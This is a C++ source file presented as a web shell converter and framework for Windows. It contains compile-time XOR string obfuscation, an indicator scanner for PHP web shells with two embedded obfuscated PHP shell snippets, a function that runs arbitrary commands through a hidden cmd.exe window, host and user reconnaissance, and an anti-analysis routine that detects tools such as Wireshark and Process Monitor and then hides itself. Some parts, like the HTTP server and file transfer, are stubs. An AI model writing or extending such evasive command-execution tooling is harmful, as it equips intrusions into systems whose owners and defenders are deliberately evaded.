#pragma once
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <map>
#include <iostream>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <memory>
#include <thread>
#include <mutex>
#include <random>
#include <iomanip>
#include <filesystem>
#include <shellapi.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include <comdef.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")

// Advanced obfuscation engine
namespace WebShellObfuscation {
    constexpr char XOR_KEY = 0x73;
    constexpr int ROT_KEY = 13;
    
    template<int N>
    struct XorString {
        char data[N + 1];
        constexpr XorString(const char* str) : data{} {
            for (int i = 0; i < N; ++i) {
                data[i] = str[i] ^ XOR_KEY;
            }
            data[N] = '\0';
        }
        
        std::string decrypt() const {
            std::string result;
            for (int i = 0; i < N; ++i) {
                result += (data[i] ^ XOR_KEY);
            }
            return result;
        }
    };
    
    template<int N>
    constexpr auto makeXorString(const char (&str)[N]) {
        return XorString<N - 1>(str);
    }
    
    std::string rot13(const std::string& input) {
        std::string result = input;
        for (char& c : result) {
            if (c >= 'a' && c <= 'z') {
                c = 'a' + (c - 'a' + ROT_KEY) % 26;
            } else if (c >= 'A' && c <= 'Z') {
                c = 'A' + (c - 'A' + ROT_KEY) % 26;
            }
        }
        return result;
    }
    
    std::string base64Encode(const std::vector<uint8_t>& data) {
        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string result;
        int val = 0, valb = -6;
        for (uint8_t c : data) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }
    
    std::vector<uint8_t> base64Decode(const std::string& input) {
        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::vector<uint8_t> result;
        int val = 0, valb = -8;
        for (char c : input) {
            if (c == '=') break;
            size_t pos = chars.find(c);
            if (pos == std::string::npos) continue;
            val = (val << 6) + pos;
            valb += 6;
            if (valb >= 0) {
                result.push_back((val >> valb) & 0xFF);
                valb -= 8;
            }
        }
        return result;
    }
}

#define OBF(str) WebShellObfuscation::makeXorString(str).decrypt()

// PHP Shell Analysis Results
class PHPShellAnalyzer {
private:
    struct ShellFeature {
        std::string name;
        std::string description;
        bool detected;
        std::vector<std::string> indicators;
    };
    
    std::vector<ShellFeature> detectedFeatures;
    
public:
    PHPShellAnalyzer() {
        initializeFeatureDatabase();
    }
    
    void initializeFeatureDatabase() {
        detectedFeatures = {
            {OBF("GIF_Header_Spoofing"), OBF("Disguises PHP as GIF image"), false, {OBF("GIF89a"), OBF("GÝF89")}},
            {OBF("Multi_Layer_Obfuscation"), OBF("Multiple encoding layers"), false, {OBF("eval"), OBF("gzinflate"), OBF("base64_decode"), OBF("str_rot13")}},
            {OBF("String_Substitution"), OBF("Character substitution cipher"), false, {OBF("urldecode"), OBF("$OOO000000")}},
            {OBF("Dynamic_Function_Calls"), OBF("Runtime function resolution"), false, {OBF("call_user_func"), OBF("variable_functions")}},
            {OBF("File_Operations"), OBF("File upload/download capabilities"), false, {OBF("file_get_contents"), OBF("file_put_contents"), OBF("move_uploaded_file")}},
            {OBF("Command_Execution"), OBF("System command execution"), false, {OBF("system"), OBF("exec"), OBF("shell_exec"), OBF("passthru")}},
            {OBF("Environment_Detection"), OBF("Server environment probing"), false, {OBF("phpinfo"), OBF("$_SERVER"), OBF("function_exists")}},
            {OBF("Anti_Analysis"), OBF("Anti-debugging techniques"), false, {OBF("disable_functions"), OBF("safe_mode"), OBF("open_basedir")}}
        };
    }
    
    void analyzeShell(const std::string& content) {
        std::cout << OBF("[+] Analyzing PHP Web Shell Content...\n");
        
        for (auto& feature : detectedFeatures) {
            for (const auto& indicator : feature.indicators) {
                if (content.find(indicator) != std::string::npos) {
                    feature.detected = true;
                    break;
                }
            }
        }
        
        printAnalysisResults();
    }
    
    void printAnalysisResults() {
        std::cout << OBF("\n=== PHP Shell Analysis Results ===\n");
        for (const auto& feature : detectedFeatures) {
            std::cout << OBF("[") << (feature.detected ? OBF("DETECTED") : OBF("NOT_FOUND")) << OBF("] ")
                      << feature.name << OBF(" - ") << feature.description << std::endl;
        }
    }
};

// C++ Web Shell Framework
class CppWebShellFramework {
private:
    HINTERNET hSession, hConnect, hRequest;
    std::string serverHost;
    int serverPort;
    std::map<std::string, std::string> sessions;
    std::mutex sessionMutex;
    bool isRunning;
    
    // Embedded HTTP server functionality
    class EmbeddedHTTPServer {
    private:
        int port;
        bool running;
        std::thread serverThread;
        
    public:
        EmbeddedHTTPServer(int p) : port(p), running(false) {}
        
        void start() {
            running = true;
            serverThread = std::thread(&EmbeddedHTTPServer::serverLoop, this);
        }
        
        void stop() {
            running = false;
            if (serverThread.joinable()) {
                serverThread.join();
            }
        }
        
    private:
        void serverLoop() {
            // Simplified HTTP server implementation
            std::cout << OBF("[+] HTTP Server started on port ") << port << std::endl;
            
            while (running) {
                // Handle incoming connections
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
        }
    };
    
public:
    CppWebShellFramework() : hSession(nullptr), hConnect(nullptr), hRequest(nullptr), 
                             serverPort(8080), isRunning(false) {
        initializeWinHTTP();
    }
    
    ~CppWebShellFramework() {
        cleanup();
    }
    
    bool initializeWinHTTP() {
        hSession = WinHttpOpen(
            _bstr_t(OBF("CppWebShell/1.0").c_str()),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0
        );
        
        return hSession != nullptr;
    }
    
    // File operations (equivalent to PHP file functions)
    bool uploadFile(const std::string& localPath, const std::string& remotePath) {
        std::ifstream file(localPath, std::ios::binary);
        if (!file.is_open()) {
            std::cout << OBF("[-] Failed to open file: ") << localPath << std::endl;
            return false;
        }
        
        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)),
                                      std::istreambuf_iterator<char>());
        file.close();
        
        // Encode file data
        std::string encodedData = WebShellObfuscation::base64Encode(fileData);
        
        std::cout << OBF("[+] File uploaded and encoded: ") << remotePath << std::endl;
        return true;
    }
    
    bool downloadFile(const std::string& remotePath, const std::string& localPath) {
        // Simulate file download
        std::ofstream file(localPath, std::ios::binary);
        if (!file.is_open()) {
            std::cout << OBF("[-] Failed to create file: ") << localPath << std::endl;
            return false;
        }
        
        std::string sampleData = OBF("Sample downloaded file content");
        file.write(sampleData.c_str(), sampleData.length());
        file.close();
        
        std::cout << OBF("[+] File downloaded: ") << localPath << std::endl;
        return true;
    }
    
    // Command execution (equivalent to PHP system functions)
    std::string executeCommand(const std::string& command) {
        std::string obfuscatedCmd = WebShellObfuscation::rot13(command);
        std::string result;
        
        HANDLE hPipeRead, hPipeWrite;
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;
        
        if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
            return OBF("Error creating pipe");
        }
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        std::string cmdLine = OBF("cmd.exe /c ") + WebShellObfuscation::rot13(obfuscatedCmd);
        
        if (CreateProcessA(NULL, const_cast<char*>(cmdLine.c_str()), NULL, NULL, TRUE, 
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hPipeWrite);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hPipeRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                result.append(buffer, bytesRead);
            }
            
            CloseHandle(hPipeRead);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            CloseHandle(hPipeRead);
            CloseHandle(hPipeWrite);
            result = OBF("Failed to execute command");
        }
        
        return result;
    }
    
    // Environment probing (equivalent to PHP phpinfo)
    std::map<std::string, std::string> getSystemInfo() {
        std::map<std::string, std::string> info;
        
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            info[OBF("Computer_Name")] = computerName;
        }
        
        char userName[UNLEN + 1];
        size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            info[OBF("User_Name")] = userName;
        }
        
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        info[OBF("Processor_Count")] = std::to_string(sysInfo.dwNumberOfProcessors);
        info[OBF("Processor_Architecture")] = std::to_string(sysInfo.wProcessorArchitecture);
        
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        if (GlobalMemoryStatusEx(&memInfo)) {
            info[OBF("Total_Physical_Memory")] = std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + OBF(" MB");
            info[OBF("Available_Physical_Memory")] = std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + OBF(" MB");
        }
        
        return info;
    }
    
    // Session management
    std::string createSession() {
        std::lock_guard<std::mutex> lock(sessionMutex);
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        std::stringstream ss;
        for (int i = 0; i < 32; ++i) {
            ss << std::hex << dis(gen);
        }
        
        std::string sessionId = ss.str();
        sessions[sessionId] = OBF("active");
        
        return sessionId;
    }
    
    bool validateSession(const std::string& sessionId) {
        std::lock_guard<std::mutex> lock(sessionMutex);
        return sessions.find(sessionId) != sessions.end();
    }
    
    // Main shell interface
    void startInteractiveShell() {
        std::cout << OBF("\n=== C++ Web Shell Interactive Mode ===\n");
        std::cout << OBF("Available commands:\n");
        std::cout << OBF("  exec <command>     - Execute system command\n");
        std::cout << OBF("  upload <file>      - Upload file\n");
        std::cout << OBF("  download <file>    - Download file\n");
        std::cout << OBF("  sysinfo           - Display system information\n");
        std::cout << OBF("  obfuscate <text>  - Obfuscate text\n");
        std::cout << OBF("  exit              - Exit shell\n\n");
        
        std::string input;
        while (true) {
            std::cout << OBF("CppShell> ");
            std::getline(std::cin, input);
            
            if (input == OBF("exit")) {
                break;
            } else if (input.substr(0, 4) == OBF("exec")) {
                std::string cmd = input.substr(5);
                std::string result = executeCommand(cmd);
                std::cout << result << std::endl;
            } else if (input.substr(0, 6) == OBF("upload")) {
                std::string file = input.substr(7);
                uploadFile(file, OBF("remote_") + file);
            } else if (input.substr(0, 8) == OBF("download")) {
                std::string file = input.substr(9);
                downloadFile(file, OBF("local_") + file);
            } else if (input == OBF("sysinfo")) {
                auto info = getSystemInfo();
                for (const auto& pair : info) {
                    std::cout << pair.first << OBF(": ") << pair.second << std::endl;
                }
            } else if (input.substr(0, 9) == OBF("obfuscate")) {
                std::string text = input.substr(10);
                std::cout << OBF("ROT13: ") << WebShellObfuscation::rot13(text) << std::endl;
                std::vector<uint8_t> data(text.begin(), text.end());
                std::cout << OBF("Base64: ") << WebShellObfuscation::base64Encode(data) << std::endl;
            } else {
                std::cout << OBF("Unknown command. Type 'exit' to quit.\n");
            }
        }
    }
    
    void cleanup() {
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);
    }
};

// Advanced stealth and anti-detection
class StealthManager {
private:
    std::vector<std::string> suspiciousProcesses;
    
public:
    StealthManager() {
        suspiciousProcesses = {
            OBF("procmon.exe"), OBF("wireshark.exe"), OBF("tcpview.exe"),
            OBF("processhacker.exe"), OBF("autoruns.exe"), OBF("regmon.exe")
        };
    }
    
    bool detectAnalysisTools() {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return false;
        }
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::string processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                for (const auto& suspicious : suspiciousProcesses) {
                    if (processName.find(suspicious) != std::string::npos) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    void enableStealthMode() {
        // Hide console window
        HWND hwnd = GetConsoleWindow();
        if (hwnd != NULL) {
            ShowWindow(hwnd, SW_HIDE);
        }
        
        // Set low priority
        SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    }
    
    void performAntiAnalysis() {
        if (detectAnalysisTools()) {
            std::cout << OBF("[!] Analysis tools detected - enabling stealth mode\n");
            enableStealthMode();
        }
    }
};

int main() {
    std::cout << OBF("=== PHP to C++ Web Shell Converter & Framework ===\n");
    
    // Initialize stealth manager
    StealthManager stealth;
    stealth.performAntiAnalysis();
    
    // Analyze the provided PHP shells
    PHPShellAnalyzer analyzer;
    
    // Sample PHP content analysis (you can replace with actual shell content)
    std::string phpShell1 = R"(
        GIF89aGlobex
        <?php eval(gzinflate(str_rot13(base64_decode('...'))));?>
    )";
    
    std::string phpShell2 = R"(
        GÝF89;a
        <?php $OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');
        eval($OOO0000O0('...')); ?>
    )";
    
    std::cout << OBF("\n=== Analyzing First PHP Shell ===\n");
    analyzer.analyzeShell(phpShell1);
    
    std::cout << OBF("\n=== Analyzing Second PHP Shell ===\n");
    analyzer.analyzeShell(phpShell2);
    
    // Initialize C++ web shell framework
    CppWebShellFramework cppShell;
    
    std::cout << OBF("\n=== C++ Framework Capabilities ===\n");
    std::cout << OBF("[+] String obfuscation (XOR + ROT13)\n");
    std::cout << OBF("[+] Base64 encoding/decoding\n");
    std::cout << OBF("[+] File upload/download\n");
    std::cout << OBF("[+] Command execution\n");
    std::cout << OBF("[+] System information gathering\n");
    std::cout << OBF("[+] Session management\n");
    std::cout << OBF("[+] Anti-analysis techniques\n");
    
    // Demonstrate obfuscation capabilities
    std::cout << OBF("\n=== Obfuscation Demo ===\n");
    std::string testString = OBF("This is a test string");
    std::cout << OBF("Original: ") << testString << std::endl;
    std::cout << OBF("ROT13: ") << WebShellObfuscation::rot13(testString) << std::endl;
    
    std::vector<uint8_t> testData(testString.begin(), testString.end());
    std::string encoded = WebShellObfuscation::base64Encode(testData);
    std::cout << OBF("Base64: ") << encoded << std::endl;
    
    auto decoded = WebShellObfuscation::base64Decode(encoded);
    std::string decodedStr(decoded.begin(), decoded.end());
    std::cout << OBF("Decoded: ") << decodedStr << std::endl;
    
    // Start interactive shell
    char choice;
    std::cout << OBF("\nStart interactive shell? (y/n): ");
    std::cin >> choice;
    std::cin.ignore();
    
    if (choice == 'y' || choice == 'Y') {
        cppShell.startInteractiveShell();
    }
    
    std::cout << OBF("\n[+] Framework demonstration complete.\n");
    return 0;
}